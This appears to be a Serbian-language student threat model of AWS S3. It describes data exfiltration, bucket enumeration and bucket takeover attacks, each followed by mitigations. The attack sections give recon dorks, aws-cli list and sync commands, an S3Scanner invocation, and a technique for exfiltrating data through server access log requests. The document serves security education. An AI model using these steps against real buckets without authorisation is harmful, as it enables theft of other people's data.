# AWS S3 eksterni servis

Amazon Simple Storage Service (S3) [[1]](#reference) je usluga za skladištenje podataka u oblaku. Dostupan je u različitim AWS regijama širom sveta. Svaka AWS regija je fizički odvojena lokacija sa svojim resursima i infrastrukturom. Korisnici mogu da odaberu AWS regiju u kojoj žele da uspostave svoje skladište podataka. Bucket je osnovna jedinica organizacije podataka koji ima jedinstveno ime unutar AWS regije. Svaki bucket ima objekte, a objekat ima jedinstveni ključ unutar bucket-a. Ključ objekta predstavlja njegovu putanju unutar bucket-a kao i njegov jedinstveni identifikator. Objekat je osnovna jedinica podatka koji se čuva.<br>
Kao i svaki drugi servis tako je i AWS S3 podložan sigurnosnim pretnjama.
1. Neovlašćeni pristup osetljivim podacima [P1] <br>
Ključni resurs koji može biti ugrožen u okviru AWS S3 usluge su bucket-i sa svojim podacima. Napadač može da pregleda podatke unutar bucket-a i na taj način, ugrožava poverljivost informacija. Ovi podaci predstavljaju vredan resurs za napadača koji ih može iskoristiti u cilju zloupotrebe, iznude ili ucene gde napadač traži novac ili nešto drugo kako ih ne bi objavio ili zloupotrebio.
2. Gubitak kontrole nad bucket-om [P2] <br>
Kao i u prethodnoj pretnji, ključni resurs koji je ugrožen jeste bucket sa svojim podacima. Pored ugrožavanja poverljivosti informacija, direktno su ugroženi i integritet i dostupnost podataka smešteni unutar njega. Napadač ima mogućnost da pregleda, menja ili briše podatake, kao i da dodaje zlonamerni sadržaj i na taj način izvodi druge napade kao što je Phishing. Na ovaj način napadač može da nanese štetu organizaciji, zloupotrebi podatke, vrši ucene ili iznude finansijskih sredstava. 

![Stablo napada](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Dijagrami/awss3-attack-tree.png)

## Napadi

### Data Exfiltration [N1]

Data exiltration [[2]](#reference), poznat kao i data extrustion, predstavlja neovlašćeni prenos ili krađu podataka koji su smešteni u S3 bucket-ovima od strane napadača. Napadač pokušava dobiti pristup osetljivim podacima koje se nalaze u bucket-ovima, pa ih preneti ili zloupotrebiti.

Napadač prvo identifikuje AWS S3 bucket koji će mu potencijalno biti cilj napada. To može učiniti koristeći različite komande kao što je Google dorks za pronalaženje S3 bucket-a koji su povezani sa određenim sajtom (komanda: site:s3.amazonaws.com <site.com>). Ovo je pretraga koja se vrši putem Google pretraživača kako bi se identifikovali potencijalni ciljni bucket-i. Drugi način bi bilo korišćenje CLI alatki za enumeraciju bucket-a kao što su Slurp, Bucket_finder, S3Scanner i Cloudlist. Ove alatke pomažu u identifikaciji dostupnih bucket-a, pristupajući informacijama o njihovim konfiguracijama i sadržaju.

Nakon pronalska potencijalnih ciljnih bucket-a sledi analiza bezbednosnih mera kako bi se identifikovale ranjivosti kao i procena da li su podaci unutar njih vredni. Da bi se proverila konfiguracija amazon S3 bucket-a potrebno je instalirati AWSCLI. Bitno je napomenuti da AWSCLI mora biti konfigurisan dodavanjem podataka o AWS nalogu, odnosno klijentskom ID-u i tajnom ključu. Nakon toga moguće je proveriti da li postoje konfiguracije koje mogu dovesti do izvršavanja napada. Kako bi se videle dozvole koristi se sledeća komanda:
 ```
     aws s3api get-bucket-acl --bucket <bucket-name>
 ```
Kako bi napadač video sadržaj u S3 bucket-u koristi sledeću komandu koja će izlistati sve datoteke i direktorijume u datom bucket-u:
 ```
    aws s3 ls s3://<bucket-name>
 ```
Ako bucket ima netačno konfigurisane dozvole, napadač može lako preuzeti podatke koristeći sledeću komandu:
 ```
    aws s3 sync s3://<bucket>/<path> </local/path>
 ```
Nakon ovih koraka napad je izvršen i napadač može da iskoristi podatke u skladu sa svojim ciljevima. Na ovaj način Data Exfiltration ostvaruje pretnju 'Neovlašćeni pristup osetljivim podacima' [P1]. Napadač može da proda osetljive informacije na crnom tržištu, da vrši iznudu ili ucenu onoga kome je podatke ukrao.

Sledeći konkretan scenario napada bi se mogao prikazati ako napadač ima kontrolu nad S3 bucket-om koji se koristi za čuvanje server access logova [[3]](#reference). Napadač aktivira server access logove na ciljnom S3 bucket-u nad kojim želi izvršiti napad data exfilitration. Sa server access loggging-om svaki zahtev ka bucket-u će biti zabeležen u bucket-u za logovanje. Ovo uključuje interne AWS zahteve ili zahteve izvršene putem AWS konzole. Čak i ako je zahtev odbijen, payload koji zahtev nosi će biti poslat ka napadačevom logging bucket-u. Napadač može slati GetObject zahteve ka S3 bucket-ovima do kojih nema pristup:
 ```
    aws s3api get-object --bucket AttackerBucket --key ExampleDataToExfiltrate
 ```
Međutim, zato što kontroliše server access logove, i dalje će primati podatke kojima inače nema pristup:
 ```
    [..] attackerbucket […] 8.8.8.8 – […] REST.GET.OBJECT ExampleDataToExfiltrate "GET /
    ExampleDataToExfiltrate HTTP/1.1" 403 AccessDenied 243 - 18 - "-" "UserAgentAlsoHasData " – […]
 ```
Na osnovu informacija iz logova napadač može rekonstruisati podatke koje je pokušao eksfiltrirati. Problem koji se javlja jeste taj što logovi koji zabeleže svaki zahtev ka bucket-u nisu nužno uređeni po vremenu dolaska. To znači da ako napadač podatke razbije na više zahteva, može se suočiti sa situacijom gde logovi stižu u nekom drugačijem redosledu. Ako pokušava da rekonstruiše podatke koji su razbijeni na više zhgteva, napadač će prvo morati razviti mehanizam koji će pravilno sortirati te logove kako bi ispravno sastavio originalne podatke.

#### Mitigacije [[4]](#reference)

1. Konfiguracija pristupa [M1] <br>
Kada je konfiguracija pristupa u pitanju, potrebno je odrediti ko ima pristup kojim podacima i na koji način. Ovo podrazumeva razna podešavanja kao sto su postavljanje Identity and Access Managment - IAM politika, Bucket-Level politika, postavljanje S3 Bucket Access Control Lists - ACL-ova [[5]](#reference).<br><br>
**IAM politike** - određuju koje su radnje dozvoljene ili odbijene na AWS uslugama/resursima za određenog korisnika. IAM politike možemo da dodelimo          specifičnom korisniku, ulozi ili grupi.<br><br>
**Bucket-Level politike** - određuju koje su radnje dozvoljene ili nisu nad specifičnim bucket-om za određene korisnike. <br><br>
**S3 Bucket ACL** - predstavlja stari način upravljanja pristupom bucket-ima. AWS preporučuje korišćenje IAM ili Bucket-Level politika, ali još uvek postoje slučajevi u kojima ACL-ovi daju veću fleksibilnost od politika. To je jedan od razloga zašto još uvek nisu zastareli niti će biti uskoro. Najznačajnija prednost jeste što se mogu dodeljivati i bucket-ima ali i samim objektima, što nije slučaj sa politikama. Znači da postoji velika fleksibilnost nad resursima jer neki objekti mogu biti javni u privatnom bucket-u kao i obrnuto. <br><br>
Najbolja praksa, bez obzira koje se od ova tri podešavanja koristi, predstavlja primenu dozvola sa najmanjim privilegijama, što znači da korisnici dobijaju samo dozvole koje su im neophodne za obavljanje sopstvenih zadataka. Time se smanjuje površina napada.<br>
Kada je u pitanju Data Exfiltration najviše pažnje treba posvetiti dozvolama za čitanje podataka (READ)
<br><br>
3. Enkripcija podataka [M2] <br>
Enkripcijom podaci postaju beskorisni napadaču jer ne može da ih pročita. Postoji nekoliko načina kako se može odraditi enkripcija kada je u pitanju AWS S3. <br><br>
**Šifrovanje na strani servera** - Amazon S3 šifruje objekte pre nego što ih sačuva na diskovima u svojim centrima podataka, a zatim dešifruje objekte kada budu preuzeti. Šifrovanje se vrši uz pomoć ključa koji se ne čuva na istom mestu gde su i podaci. Amazon S3 nudi nekoliko opcija za šifrovanje na strani servera kao što su: šifrovanje pomoću Amazon S3 managed keys (SSE-S3), AWS Key Managment Service keys (SSE-KMS) i pomoću ključa koji obezbeđuje korisnik (SSE-C). <br><br>
**Šifrovanje na strani klijenta** - podrazumeva da korisnik pošalje već šifrovane podatke na Amazon S3. U ovom slučaju on upravlja procesom šifrovanja, ključevima za šifrovanje i povezanim alatima. <br><br>
4. Praćenje i detekcija aktivnosti [M5] <br>
Ukoliko se napad desi veoma je bitno da na vreme bude identifikovan. To se može uraditi korišćenjem alata kao što je AWS CloudTrail koji se koristi za praćenje svih aktivnosti na AWS-u. CloudTrail beleži događaje i aktivnosti vezane za AWS nalog i smešta podatke u CloudTrail log grupe, gde se lako mogu pregledati i analizirati. Iz podataka se može zaključiti zahtev koji je upućen, IP adresa sa koje je zahtev podnet, ko je i kada podneo zahtev, kao i drugi dodatni detalji o samom zahtevu. <br>
Za zaštitu od Data Exfiltration napada bitno je što CloudTrail može pratiti svaki zahtev za prenos podataka između S3 bucket-a i drugih AWS resursa. Sumnjive aktivnosti koje ukazuju na velike prenose podataka ili nepravilne upite mogu biti detektovane i istražene. Naravno, ovo je moguće pod uslovom da napadač ne obriše logove kako bi sakrio tragove napada. 

### Bucket Enumeration <a id="N2">[N2]</a>

Bucket Enumeration  [[6]](#reference) je napad koji podrazumeva otkrivanje postojanja S3 bucket-a i proveru da li su oni javni. Ovaj napad je važan korak za napadače koji planiraju potencijalne napade na podatke koji se nalaze u tim bucket-ima (kao što je Data Exfiltration [N1] ili Bucket Takeover [N3]). Medjutim može biti i deo bezbednosne analize sa ciljem otkrivanja potencijalnih rizika. 

Prvi način na koji napad može da se izvede jeste tako što će se prvo odraditi pasivno istraživanje (PASSIVE RECON), tj identifikacija da li neki veb sajt koristi S3 bucket-e, kao i otkrivanje regije kojoj pripada. Otkrivanje regije nije obavezan korak, ali svakako može olakšati i uštedeti vreme prilikom pogađanja imena bucket-a, jer različite regije imaju različita imena bucket-a. Za ovaj korak se može koristiti nslookup u slučaju da web server koji koristi S3 bucket nije zaštićen WAF-om (Web Application Firewall). Na Slici 2.1 se vidi da je IP adresa locirana u regionu us-west-2. <br><br>
![Slika 2.1](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/nslookup.PNG) <br>Slika 2.1<br>

Sada kada napadač ima ove informacije, sledeći korak predstavlja aktivno istraživanje (ACTIVE RECON), tj izvršavanje opštih upita i enumeracija imena bucket-a. Napadač bi trebalo da izvrši enumeraciju poddomena, domena i domena najvišeg nivoa kako bi se uverio da ciljni sajt ima S3 bucket. Za pogađanje imena bucket-a, može koristiti rečnik sa često korišćenim imenima ili praveći nasumične kombinacije. Npr ako traži bucket-e koji pripadaju www.geeksforgeeks.com, tada bi trebao probati imena bucket-a poput geeksforgeeks.com ili www.geeksforgeeks.com. Kada uspe da otkrije ime bucket-a, moći če direktno posetiti automatski dodeljeni S3 URL koji daje Amazon, gde će format biti: http://bucketname.s3.amazonaws.com kao što je prikazano na Slici 2.2.<br><br>
![Slika 2.2](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/bucketname.s3.amazonaws.PNG) <br>Slika 2.2<br>

Još jedan način za izvođenje bucket enumeration-a bi bio upotrebom third-party alata [[7]](#reference). Postoje različiti third-party alati i skripte koje mogu automatizovati proces pronalaženja S3 bucket-a.
Jedan od takvih alata je S3Scanner. S3Scanner je popularan alat otvorenog koda koji se koristi za identifikaciju javno dostupnih Amazon S3 bucket-a i izvlačenje interesantnih informacija iz njih. Alat se pokreće komandom sa odgovarajućim ciljnim domenom example.com:
 ```
     python s3scanner.py example.com
 ```
S3Scanner će skenirati javno dostupne bucket-e i prikazati rezultate, uključujući imena bucket-a i povezane URL-ove.

Nakon što je pronađen javno dostupan bucket, ostvarena je pretnja 'Neovlašćen pristup osetljivim podacima' [P1].

#### Mitigacije

1. Konfiguracija pristupa [M1] <br>
Kao što je detaljnije opisano kod prethodnog napada i ovde je potrebno voditi računa o podešavanjima kao sto su postavljanje Identity and Access Managment - IAM politika, Bucket-Level politika, postavljanje S3 Bucket Access Control Lists - ACL-ova. Bucket će biti podložan ovom napadu kada je Public i iz tog razloga ovo treba izbegavati. Međutim ukoliko postoji potreba da ipak bude javan, bitno je podesiti zaštitu na nivou samih objekata koje želimo da zaštitimo.

2. Upotreba neuobičajenih imena za bucket-e [M3]<br>
Upotrebom neuobičajenih i teško predvidivih imena može se povećati bezbednost i otežati neovlašćenim osobama da ih lako otkriju. Bitno je izbegavati ključne reči, brendove ili informacije o sadržaju prilikom izbora imena. Ako se koriste jasno definisana i predvidljiva imena napadači će ih mnogo lakše i brže identifikovati. Kada se koriste složeni nazivi mnogo je teže generisati takvo ime, a samim tim i pronaći bucket.

3. Enkripcija podataka [M2]<br>
Nakon što su pronadjeni javni bucket-i, napadač može da vidi podatke koji se nalaze u njima te ih je neophodno enkriptovati korišćenjem tehnika koje su opisane u prethodnom napadu.

4. Praćenje i detekcija aktivnosti [M5] <br>
CloudTrail beleži svaki zahtev za pristup bucket-ovima, što omogućava identifikaciju slučajeva gde napadači pokušavaju identifikovati dostupne bucket-ove. Nakon što se napad uoči, ažuriranje bezbednosnih politika i brza reakcija mogu ograničiti potencijalne pretnje.
 
### Bucket takeover [N3]

Napadač preuzima kontrolu nad nepravilno konfigurisanim Amazon S3 bucket-om koji je prethodno bio pod kontrolom legitimnog vlasnika.

Prvo je potrebno identifikovati bucket-e koji će biti meta napada. Budući da Bucket Enumeration predstavlja pronalazak javnih bucket-a upravo ovaj napad često predhodi Bucket Takeover napadu. Nakon identifikacije ciljnog bucket-a sledi proučavanje konfiguracije kao što su podešavanja IAM politika, Bucket-Level politika, S3 Bucket ACL-ova i drugih sa ciljem pronalska potencijalnih ranjivosti. Napadač zatim pokušava da preuzme kontrolu nad bucket-om kradjom autentifikacionih podataka, iskorišćavanjem ranjivosti ili pokušajem preuzimanja kontrole nad IAM ulogama koje imaju pristup bucket-u. Nakon preuzimanja bucket-a, ostvarena je pretnja 'Gubitak kontrole nad bucket-om' [P2]. Napadač nakon toga može da promeni konfiguracije bucket-a kako bi omogućio šire privilegije, dodao ili izbrisao IAM korisnike ili role, promenio Bucket-Level politike ili S3 Bucket ACL-ove u svoju korist. Ima mogućnost narušavanja integriteta podataka jer može da ih menja, briše ili dodaje nove. Može da izvršava druge napade kao što su Data Exfilitration ili Phishing napad dodavanjem zlonamernih objekata. 

#### Mitigacije 

1. Konfiguracija pristupa [M1]<br>
Kao i u pretnodna dva napada, konfiguracija pristupa igra ključnu ulogu kada je reč u prevencijama napada. <br><br>
2. Multifaktorska autentifikacija (MFA) [M4] <br>
Multifaktorska autentifikacija (MFA) je snažna bezbednosna praksa koja dodaje dodatni sloj autentifikacije kako bi se zaštitili korisnički nalozi i resursi, uključujući Amazon S3 bucket-ove. MFA za S3 resurse može se primeniti kako bi se otežao ili onemogućio neovlašćeni pristup, posebno nakon napada kao što je Bucket Takeover. Npr MFA se može postaviti pre nego što se korisniku dozvoli da menja neki resurs ili da ga briše. <br><br>
3. Enkripcija podataka [M2]<br>
Ukoliko je kontrola nad bucket-om već izgubljena dobro bi bilo da su podaci šifrovani, korišćenjem tehnika za šifrovanje koje su prethodno opisane, kako makar ne bi mogao da ih zloupotrebi. <br><br>
4. Praćenje i detekcija aktivnosti [M5] <br>
CloudTrail omogućava praćenje svih događaja i aktivnosti unutar AWS infrastrukture, uključujući promene u konfiguraciji S3 bucket-a. Bilo kakve nepravilnosti ili promene u privilegijama i pravilima pristupa mogu biti brzo identifikovane.

# Reference

[1] https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html *

[2] https://www.shehackske.com/how-to/data-exfiltration-on-cloud-1606/ *

[3] https://hackingthe.cloud/aws/exploitation/s3_server_access_logs/ *

[4] https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html *

[5] https://binaryguy.tech/aws/s3/iam-policies-vs-s3-policies-vs-s3-bucket-acls/ *

[6] https://www.geeksforgeeks.org/s3-bucket-enumeration-and-exploitation/ *

[7] https://medium.com/@aka.0x4C3DD/s3-bucket-enumeration-research-and-insights-674da26c049e *

[8] https://socradar.io/aws-s3-bucket-takeover-vulnerability-risks-consequences-and-detection/ - bucket takeover
   
